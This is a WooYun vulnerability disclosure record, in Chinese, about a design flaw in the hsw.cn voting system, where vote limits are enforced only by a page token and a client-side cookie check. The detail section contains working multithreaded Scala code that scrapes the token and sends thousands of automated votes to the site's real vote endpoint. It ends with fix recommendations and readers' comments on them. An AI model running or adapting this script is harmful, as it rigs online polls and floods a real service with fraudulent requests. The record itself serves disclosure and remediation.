{"id": 22604, "wybug_id": "wooyun-2011-02378", "wybug_title": "华商网 投票系统设计缺陷", "wybug_corp": "华商网", "wybug_author": "小数点", "wybug_date": "2011-07-04 00:06", "wybug_open_date": "2011-07-04 13:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["投票安全", "刷票", "敏感操作校验不足", "投票敏感", "敏感接口缺乏校验", "投票安全解决方案"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-07-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-07-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 投票限制形同虚设专题地址：http://health.hsw.cn/system/2011/05/11/050936197.shtml 详细说明：  \n\n专题地址：http://health.hsw.cn/system/2011/05/11/050936197.shtmlfirame嵌入投票地址：http://toupiao.hsw.cn/fangchan/index_all.php?table=109&n=75&width=125&height=160&s=5&widths=900投票已代码里的一个code，及本地js判断cookie限制，系统虚设。一个简单的多线程就能在几分钟内头上上万票。   漏洞证明：  上面的投票基本多少在几分钟内跑出来的。测试的部分scala代码(自己封装的一个httpclient类)：    val header = HttpClientService.getDefaultHeader    header += ((\"Referer\", \"http://toupiao.hsw.cn/fangchan/index_all.php?table=109&n=75&width=125&height=160&s=5&widths=900\"))    val mybreaks = new scala.util.control.Breaks    import mybreaks.{break, breakable}    val num = 165    val countDownLatch = new CountDownLatch(num);    for (i <- 1 to num) {      val vid = i      new Thread() {        override def run() {          var httpClientService = new HttpClientServiceImpl          httpClientService.setCharset(\"UTF-8\")          breakable {            for (j <- 1 to 10000) {              try {                var html = httpClientService.get(\"http://toupiao.hsw.cn/fangchan/index_all.php?table=109&n=75&width=125&height=160&s=5&widths=900\")                val source = new Source(html)                val code = source.getElementById(\"code\").getAttributeValue(\"value\")               // println(\"code:\" + code)                //var ret = httpClientService.get(\"http://toupiao.hsw.cn/fangchan/counts.php?action=result&vote_id=\" + vid + \"&value=1&table=109&a=\" + code, null, header)                //println(this.getId + \":\" + vid + \":\" + ret)                //if (ret.trim.toInt < 148038) {                val ret = httpClientService.get(\"http://toupiao.hsw.cn/fangchan/counts.php?action=vote&vote_id=\" + vid + \"&value=1&table=109&a=\" + code, null, header)                  println(ret)                //} else {                //  break                //}              } catch {                case e =>                  e.printStackTrace()              }            }          }          countDownLatch.countDown()        }      }.start()    }    countDownLatch.await()   修复方案：  1.投票加ip限制2.加用户登录及用户投票数限制3.复杂的验证码4.php内使用memcache的add方法，数据库唯一索引等防止并发   版权声明：转载请注明来源 小数点@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：12 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-07-11 15:37 |    \t\t晴天小铸 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | 退出黑客界的纠纷,低调求发展。)\t\t \n  JS 不错 学习    \n     2011-07-11 23:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  赞解决方案！    \n     2011-07-12 13:38 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  如果是限制IP的话，那么整个局域网里的都没发投票了    \n     2011-07-12 20:57 |    \t\twdlei \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:6        | 安全界里的年轻人。)\t\t \n  IP限制指的是一个IP指能投一次票吧    \n     2011-07-13 15:32 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  回答楼上的。。。一个局域网通常只有一个IP，就是说一个学校几万人也只能投一次了。因此限制IP不是太好，强制手机注册帐号或邮件注册帐号进行投票可以减少无限制刷票。    \n     2011-07-13 15:33 |    \t\t晴天小铸 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | 退出黑客界的纠纷,低调求发展。)\t\t \n  对    \n     2012-04-10 01:34 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  给的rank很高    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 12, "Ranks": null}